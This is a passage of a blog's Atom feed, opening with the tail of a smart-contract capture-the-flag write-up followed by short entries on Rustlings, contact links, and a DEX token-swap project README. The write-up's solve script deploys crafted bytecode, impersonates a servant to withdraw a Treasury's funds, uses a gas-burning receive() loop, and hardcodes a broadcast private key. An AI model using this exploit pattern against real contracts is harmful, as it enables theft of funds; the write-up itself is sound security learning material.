&lt;&#x2F;span&gt;&lt;span&gt;bytes32 secret = bytes32(abi.encodePacked(&amp;quot;I&amp;#39;m_L0yal;)&amp;quot;)) &amp;gt;&amp;gt; (24 * 7);
&lt;&#x2F;span&gt;&lt;span&gt;require(keccak256(abi.encodePacked(secret)) == keccak256(abi.encodePacked(encodedSecret)));
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Our contract returns &quot;I&#x27;m_L0yal;)&quot; which, when shifted right by 24*7 bits, matches the required secret.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;solution-script&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-script&quot; aria-label=&quot;Anchor link for: solution-script&quot;&gt;Solution Script&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;SolveScript.s.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;contract SolveScript is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    Setup public set = Setup(payable(0x5a825D1C0B1cE08dAd551a73a180785598FD22eE));
&lt;&#x2F;span&gt;&lt;span&gt;    SecretChecker public secretChecker;
&lt;&#x2F;span&gt;&lt;span&gt;    Treasury public treasury;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function setUp() public {}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function run() public {
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(0x0abccce2d992649ac814a88542efa920523c780b101babc97ff79651a4652ff1);
&lt;&#x2F;span&gt;&lt;span&gt;        secretChecker = set.secretChecker();
&lt;&#x2F;span&gt;&lt;span&gt;        treasury = set.treasury();
&lt;&#x2F;span&gt;&lt;span&gt;        AttackDeployer attack = new AttackDeployer();
&lt;&#x2F;span&gt;&lt;span&gt;        address servant = attack.exploit();
&lt;&#x2F;span&gt;&lt;span&gt;        treasury.BecomeServant(address(attack));
&lt;&#x2F;span&gt;&lt;span&gt;        treasury.withdraw();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        secretChecker.IKnowTheSecret(servant);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;SecretIsLeaked : &amp;quot;, secretChecker.SecretIsLeaked());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract AttackDeployer {
&lt;&#x2F;span&gt;&lt;span&gt;    function exploit() public returns (address) {
&lt;&#x2F;span&gt;&lt;span&gt;         &#x2F;&#x2F;    bytes32 secret = bytes32(abi.encodePacked(&amp;quot;I&amp;#39;m_L0yal;)&amp;quot;)) &amp;gt;&amp;gt; (24 * 7); &#x2F;&#x2F;0x00000000000000000000000000000000000000000049276d5f4c3079616c3b29
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F;    console.logBytes32(secret);
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; RUNTIME : 6a49276d5f4c3079616c3b2960005260206000f3  &#x2F;&#x2F; 6a49276d5f4c3079616c3b29600052600b6015f3
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; INIT: 6014600c60003960146000f3 6a49276d5f4c3079616c3b2960005260206000f3
&lt;&#x2F;span&gt;&lt;span&gt;        bytes memory bytecode = hex&amp;quot;6014600c60003960146000f36a49276d5f4c3079616c3b2960005260206000f3&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;        address _solver;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 _size;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            _solver := create(0, add(bytecode, 0x20), mload(bytecode))
&lt;&#x2F;span&gt;&lt;span&gt;            _size := extcodesize(_solver)
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        require(_solver != address(0));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Code size : &amp;quot;, _size);
&lt;&#x2F;span&gt;&lt;span&gt;        return _solver;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    receive() external payable {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 a = 2;
&lt;&#x2F;span&gt;&lt;span&gt;        while (true) {
&lt;&#x2F;span&gt;&lt;span&gt;            a = a * a;
&lt;&#x2F;span&gt;&lt;span&gt;        }   
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;p&gt;The flag &lt;code&gt;r3venge_t4k3n_5ucc3s5fu11y!;)&lt;&#x2F;code&gt; is well deserved for this clever exploit that combines multiple concepts in smart contract security!&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Thanks to making it this far!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Rustlings</title>
        <published>2024-12-09T00:00:00+00:00</published>
        <updated>2024-12-09T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/rustlings/"/>
        <id>https://themj0ln1r.github.io/writeups/rustlings/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/rustlings/">&lt;p&gt;Brushing up Rust programming skills everyday with &lt;a href=&quot;https:&#x2F;&#x2F;rustlings.cool&quot;&gt;Rustlings&lt;&#x2F;a&gt;. Solved all the 94 tasks and re-visited Rust lang book once again (Yeah its totally worth it).&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;rustlings&quot;&gt;TheMj0ln1r&#x2F;rustlings&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Contact Me</title>
        <published>2024-10-07T00:00:00+00:00</published>
        <updated>2024-10-07T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/contact/"/>
        <id>https://themj0ln1r.github.io/contact/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/contact/">&lt;p&gt;Hello anon, this is Charan Nomula aka MJ0LN1R or THEMJ0LN1R.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;x.com&#x2F;TheMj0ln1r&#x2F;&quot; target=_blank&gt;Twitter&#x2F;X&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;linkedin.com&#x2F;in&#x2F;mj0ln1r&#x2F;&quot; target=_blank&gt;Linkein&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;&quot; target=_blank&gt;Github&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a hfef=&quot;mailto: playermj0ln1r@gmail.com&quot; target=_blank&gt;Email&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DexSwap</title>
        <published>2024-01-23T00:00:00+00:00</published>
        <updated>2024-01-23T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/projects/dexcontract/"/>
        <id>https://themj0ln1r.github.io/projects/dexcontract/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/projects/dexcontract/">&lt;p&gt;A simple DEX Token Swap Project developed by me for an internship task.&lt;&#x2F;p&gt;
&lt;p&gt;Project Repo :  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;DEX-Token-Swap&quot; target=_blank&gt;DEX Token Swap&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;erc20-token-swap&quot;&gt;ERC20 Token Swap&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;This TokenSwap smart contract facilitates the swapping of one ERC-20 token for another at a predefined exchange rate&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;documentation&quot;&gt;Documentation&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;Note : Most of the functionality of this pool is inspired by the design of &lt;code&gt;UniswapV2&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;features&quot;&gt;Features&lt;&#x2F;h2&gt;
&lt;p&gt;The smart contract include the following features:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Users can swap Token A for Token B and vice versa.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The exchange rate between Token A and Token B is fixed &lt;code&gt;(1.2)&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Users can provide liquidity to the pool in return they get &lt;code&gt;shares&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Users can remove their liquidity from the pool.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;design-choices&quot;&gt;Design Choices&lt;&#x2F;h2&gt;
&lt;p&gt;The &lt;code&gt;TokenSwapPool&lt;&#x2F;code&gt; contract is a simplified liquidity pool for swapping between two ERC-20 tokens (tokenA and tokenB) at a &lt;strong&gt;fixed exchange rate&lt;&#x2F;strong&gt;. It is an ERC-20 token itself, representing &lt;strong&gt;shares&lt;&#x2F;strong&gt; in the pool, which users get when they provide liquidity.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Immutables:&lt;&#x2F;strong&gt; &lt;code&gt;token0&lt;&#x2F;code&gt; and &lt;code&gt;token1&lt;&#x2F;code&gt; are immutable variables storing the addresses of the ERC-20 tokens that can be swapped. Once set in the constructor, their values cannot be changed.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Reserves:&lt;&#x2F;strong&gt; &lt;code&gt;reserves0&lt;&#x2F;code&gt; and &lt;code&gt;reserves1&lt;&#x2F;code&gt; keep track of the amounts of &lt;code&gt;token0&lt;&#x2F;code&gt; and &lt;code&gt;token1&lt;&#x2F;code&gt; in the pool, respectively.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Swap Function:&lt;&#x2F;strong&gt; Allows users to swap between &lt;code&gt;token0&lt;&#x2F;code&gt; and &lt;code&gt;token1&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;User have to send the amount of token that has to be swapped in the same transaction that calls &lt;code&gt;swap&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;It checks the balance difference before and after the transfer to find the amount sent by the user and then performs the swap based on the fixed exchange rate.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Then it checks that which token amount was sent by the user by checkng the following condition.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;if (_tokenIn == address(token0))&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If the user sent &lt;code&gt;tokenA&lt;&#x2F;code&gt; and wants to get &lt;code&gt;tokenB&lt;&#x2F;code&gt; the &lt;code&gt;if&lt;&#x2F;code&gt; block will execute.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Then the &lt;code&gt;amountToSend&lt;&#x2F;code&gt; will be calculated with the fixed exchange rate.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The exchange rate I used is &lt;code&gt;1.2&lt;&#x2F;code&gt;, so to handle with decimals in solidity I multiplied with &lt;code&gt;10&lt;&#x2F;code&gt; and devided with &lt;code&gt;12&lt;&#x2F;code&gt; in case of &lt;code&gt;tokenA&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If the user sent &lt;code&gt;tokenB&lt;&#x2F;code&gt; and wants to get &lt;code&gt;tokenB&lt;&#x2F;code&gt; the &lt;code&gt;else&lt;&#x2F;code&gt; block will execute.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;To calculate &lt;code&gt;amountToSend&lt;&#x2F;code&gt;, the &lt;code&gt;amountIn&lt;&#x2F;code&gt; will be multiplied with &lt;code&gt;12&lt;&#x2F;code&gt; and divided with &lt;code&gt;10&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This will maintain the &lt;code&gt;fixed exchange rate&lt;&#x2F;code&gt; for the exchange.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;addLiquidity Function:&lt;&#x2F;strong&gt; Add liquidity to the pool by sending both &lt;code&gt;token0&lt;&#x2F;code&gt; and &lt;code&gt;token1&lt;&#x2F;code&gt; to the contract.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The function calculates the number of share tokens (liquidity tokens) to mint based on the amounts added and the current pool size.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The both tokens amounts should be sent in the same transaction with calls the &lt;code&gt;addLiquidity&lt;&#x2F;code&gt; function.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;When liquidity is added for the first time, the contract calculates the initial liquidity shares based on the &lt;code&gt;square root&lt;&#x2F;code&gt; of the product of the amounts of the two tokens.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;A minimum liquidity amount &lt;code&gt;(_mint(address(0xdeadbeef), 1000))&lt;&#x2F;code&gt; is minted initially to lock some liquidity.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The address &lt;code&gt;0xdeadbeef&lt;&#x2F;code&gt; is taken to assume that no one has the private key of it.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;In &lt;code&gt;Uniswap V2&lt;&#x2F;code&gt; it was &lt;code&gt;address(0)&lt;&#x2F;code&gt;, but if we use &lt;code&gt;address(0)&lt;&#x2F;code&gt; here the &lt;code&gt;ERC20&lt;&#x2F;code&gt; contract of &lt;code&gt;OpenZeppelin&lt;&#x2F;code&gt; reverts if the address passed to &lt;code&gt;_mint&lt;&#x2F;code&gt; is &lt;code&gt;0&lt;&#x2F;code&gt; then it will revert.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;To solve this &lt;code&gt;Uniswap V2&lt;&#x2F;code&gt; implements its own &lt;code&gt;UniswapERC20&lt;&#x2F;code&gt; contract.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;removeLiquidity:&lt;&#x2F;strong&gt; Allows users to burn their share tokens and withdraw a proportional amount of &lt;code&gt;token0&lt;&#x2F;code&gt; and &lt;code&gt;token1&lt;&#x2F;code&gt; from the pool.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;It is assumed that the burner sent in share tokens before calling removeLiquidity, but advisably as part of one transaction.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If the total supply of share tokens is 1,000, and they burn 100 share tokens, then they get 10% of the token0 and token1 held by the pool.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;_shareTokens &#x2F; totalSupply is their burned share of the total supply of share tokens.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;_update function:&lt;&#x2F;strong&gt; Updates the reserves of the pool.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;getReserves function:&lt;&#x2F;strong&gt; Getter function for the &lt;code&gt;reserves0&lt;&#x2F;code&gt; and &lt;code&gt;reserves1&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Events:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;```solidity
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSwap_Liquidity_Minted(address _to, uint _shareTokens);
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSwap_Liquidity_Burned(address sender, uint amount0, uint amount1, address _to);
&lt;&#x2F;span&gt;&lt;span&gt;event TokenSwap_Swap(address, address, uint);
&lt;&#x2F;span&gt;&lt;span&gt;```
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;Errors:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;```solidity
&lt;&#x2F;span&gt;&lt;span&gt;error TokenSwap_Invalid_Address();
&lt;&#x2F;span&gt;&lt;span&gt;error TokenSwap_Invalid_Exchange_Rate();
&lt;&#x2F;span&gt;&lt;span&gt;error TokenSwap_TokenA_Transfer_Failed();
&lt;&#x2F;span&gt;&lt;span&gt;error TokenSwap_TokenB_Transfer_Failed();
&lt;&#x2F;span&gt;&lt;span&gt;error TokenSwap_Invalid_Amount();
&lt;&#x2F;span&gt;&lt;span&gt;error TokenSwap_No_Liquidity_Shares();
&lt;&#x2F;span&gt;&lt;span&gt;error TokenSale_No_Liquidity_Output();
&lt;&#x2F;span&gt;&lt;span&gt;```
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;security-considerations&quot;&gt;Security Considerations&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;SafeERC20 Usage:&lt;&#x2F;strong&gt; The SafeERC20 library for token transfers, which helps guard against potential vulnerabilities such as reentrancy attacks by ensuring that ERC-20 token transfers are executed safely.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Custom Error Types:&lt;&#x2F;strong&gt; Custom error types are defined to provide specific and clear error messages when certain conditions are not met. This can help users understand the reason for a transaction failure.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Input Validation:&lt;&#x2F;strong&gt; Checks for valid addresses in the constructor and various functions, preventing potential issues related to invalid or zero addresses.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Minimum Liquidity Lock:&lt;&#x2F;strong&gt; A minimum liquidity amount is minted initially to lock some liquidity. This prevents an &lt;code&gt;inflation attack&lt;&#x2F;code&gt; where an attacker could artificially inflate the liquidity.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Liquidity Minting Approach:&lt;&#x2F;strong&gt; The contract calculates initial liquidity shares using a &lt;code&gt;square root&lt;&#x2F;code&gt; function, inspired by &lt;code&gt;Uniswap V2&lt;&#x2F;code&gt;. This approach aims to mitigate the &quot;&lt;strong&gt;doubling liquidity&lt;&#x2F;strong&gt;&quot; problem that could lead to unintended consequences.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Fixed Exchange Rate:&lt;&#x2F;strong&gt; Used a fixed exchange rate between token0 and token1 This simplifies the contract, it is important to note that in dynamic market conditions, fixed exchange rates may expose users to &lt;code&gt;impermanent loss&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Minimum Liquidity Check:&lt;&#x2F;strong&gt; The &lt;code&gt;addLiquidity&lt;&#x2F;code&gt; function checks that the calculated liquidity shares are not zero before minting new liquidity tokens. This prevents users from adding liquidity with extremely low or zero values.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Reentrancy Protection:&lt;&#x2F;strong&gt; Ensuring that functions are not susceptible to reentrancy attacks by applying &lt;code&gt;nonReentrant&lt;&#x2F;code&gt; modifier.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Drawbacks&lt;&#x2F;strong&gt; The &lt;code&gt;swap&lt;&#x2F;code&gt; function transfers tokens with the predetermined exchange rate(12). So, the tokens of exchange will always be same. i.e If user sent X amount of tokens at one time he will get Y amount of tokens. This will hold for any time. That is user will will get same amount of tokens for every swap he made. And there is no check that liquidity of the pool is maintained or not. We cant use &lt;code&gt;constant product AMM&lt;&#x2F;code&gt; because the exchange rate will be varied with the amount od tokens present in the pool. And the &lt;code&gt;liquidators&lt;&#x2F;code&gt; wont receive any fee as the fee is not used in this contract.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;test-cases&quot;&gt;Test Cases&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;testConstructor:&lt;&#x2F;strong&gt; Verifies that the constructor of the TokenSwapPool contract reverts if invalid addresses (zero addresses) are passed as parameters.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testAddLiquidityFailing:&lt;&#x2F;strong&gt; Checks that adding liquidity to the TokenSwapPool fails and reverts when the address provided is invalid or if there are no liquidity shares to add (i.e., the balances of tokens transferred to the pool are zero).&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testAddLiquidity:&lt;&#x2F;strong&gt; Tests the successful addition of liquidity to the pool. It checks the initial state of the pool, transfers tokens to the pool, and then adds liquidity from the user. It verifies if the minted shares and total supply are updated correctly.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testAmountAddLiquidityMultipleTimes:&lt;&#x2F;strong&gt; Confirms that liquidity can be added multiple times and calculates the expected shares based on the pool&#x27;s reserves and total supply. It ensures that minted shares are correctly accounted for after each addition.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testAmountAddLiquidityDifferentRatio:&lt;&#x2F;strong&gt; Similar to the previous test, but with a different ratio of TokenA to TokenB, ensuring that the minted shares are calculated correctly based on the provided ratio.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testRemoveLiquidityFail:&lt;&#x2F;strong&gt; Ensures that attempting to remove liquidity fails when the address provided is invalid or if there&#x27;s no liquidity output expected (i.e., the shares to be burned are zero).&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testRemoveLiquidity:&lt;&#x2F;strong&gt; Tests the successful removal of liquidity from the pool. It verifies that the tokens are returned to the user correctly and that the total supply of liquidity shares is updated.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testSwapMyA:&lt;&#x2F;strong&gt; Simulates a swap of TokenA for TokenB by a user and verifies that the user&#x27;s token balances are updated correctly after the swap.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testSwapMyB:&lt;&#x2F;strong&gt; Simulates a swap of TokenB for TokenA by a user and ensures that the user&#x27;s token balances are updated correctly after the swap.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testSwapFails:&lt;&#x2F;strong&gt; Checks that attempting to swap with an invalid amount (zero) or an invalid address causes the contract to revert.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testGetReserves:&lt;&#x2F;strong&gt; Confirms that the getReserves function returns the correct reserves of TokenA and TokenB in the pool.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;testDeployScript:&lt;&#x2F;strong&gt; Verifies that the deployment script works correctly by deploying the contracts and checking that the addresses of the deployed contracts are non-zero.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;mj0ln1r@Linux:~&#x2F;dex-token-swap$ forge coverage
&lt;&#x2F;span&gt;&lt;span&gt;[‚†¢] Compiling...
&lt;&#x2F;span&gt;&lt;span&gt;[‚†î] Compiling 34 files with 0.8.23
&lt;&#x2F;span&gt;&lt;span&gt;[‚†ä] Solc 0.8.23 finished in 8.26s
&lt;&#x2F;span&gt;&lt;span&gt;Compiler run successful!
&lt;&#x2F;span&gt;&lt;span&gt;Analysing contracts...
&lt;&#x2F;span&gt;&lt;span&gt;Running tests...
&lt;&#x2F;span&gt;&lt;span&gt;| File                | % Lines        | % Statements   | % Branches     | % Funcs       |
&lt;&#x2F;span&gt;&lt;span&gt;|---------------------|----------------|----------------|----------------|---------------|
&lt;&#x2F;span&gt;&lt;span&gt;| script&#x2F;Deploy.s.sol | 100.00% (4&#x2F;4)  | 100.00% (4&#x2F;4)  | 100.00% (0&#x2F;0)  | 100.00% (1&#x2F;1) |
&lt;&#x2F;span&gt;&lt;span&gt;| src&#x2F;TokenSwap.sol   | 98.31% (58&#x2F;59) | 98.86% (87&#x2F;88) | 95.45% (21&#x2F;22) | 100.00% (7&#x2F;7) |
&lt;&#x2F;span&gt;&lt;span&gt;| Total               | 98.41% (62&#x2F;63) | 98.91% (91&#x2F;92) | 95.45% (21&#x2F;22) | 100.00% (8&#x2F;8) |
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;build&quot;&gt;Build&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge build
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;test&quot;&gt;Test&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge test
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;format&quot;&gt;Format&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge fmt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;deploy&quot;&gt;Deploy&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;$ forge script script&#x2F;Deploy.s.sol:TokenSwapScript --rpc-url &amp;lt;your_rpc_url&amp;gt; --private-key &amp;lt;your_private_key&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>MultiSig</title>
        <published>2024-01-23T00:00:00+00:00</published>
        <updated>2024-01-23T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/projects/multisigproject/"/>
        <id>https://themj0ln1r.github.io/projects/multisigproject/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/projects/multisigproject/">&lt;p&gt;A simple MultiSig Wallet Project developed by me for an internship task.&lt;&#x2F;p&gt;
&lt;p&gt;Project Repo :  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;MultiSig-Wallet&quot; target=_blank&gt;MultiSig Project&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
